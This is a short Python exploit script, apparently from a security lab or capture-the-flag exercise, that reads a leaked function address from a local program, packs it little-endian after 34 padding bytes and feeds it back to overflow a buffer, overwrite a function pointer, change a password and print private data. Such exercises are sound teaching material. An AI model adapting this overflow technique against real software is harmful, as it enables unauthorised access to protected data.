import InputExec, fileMerger


result = InputExec.inputExec("begin.txt", "./exploit") # doing a first round to get the target function address
#print(result)
result = result.split(b'\n')
addr = ""
for line in result:
    if line.startswith(b"secret"):
        addr = line.split(b":")[1].split(b" ")[0]
        if addr.startswith(b"0x"):
            addr = addr[2:]
        break
print(addr) # addr supposed to be the correct address of the target function
byte_arr = [addr[i:i+2] for i in range(0, len(addr), 2)]
byte_arr.reverse() # putting it in little endian format
little_endian_binary = ''.join([f'\\x{byte.decode("ascii")}' for byte in byte_arr])
print(little_endian_binary) # printing with format \xXX\xXX...
some_bytes = bytearray(int(byte, 16) for byte in byte_arr)
immutable_bytes = bytes(some_bytes)
bufferSize = 34
with open("address", "wb") as binary_file: # writing address in 'address' file with the number of character required to reach the target attribute
    for _ in range(bufferSize):
        binary_file.write(b'a')
    binary_file.write(immutable_bytes)
fileMerger.fileMerger("init address end.txt", "inject") # merging into inject file
# init contains initialisation of value, with password setting and private and public information filling, then call f3, address is used as input, so overflowing the buffer and replacing the pointer of function pointer attribute address, end contains duplication of object then call, modifying the password with an unexpected use of the function pointer and then printing private information using given password to prove it has been modified
result = InputExec.inputExec("inject", "./exploit") # doing the exploit
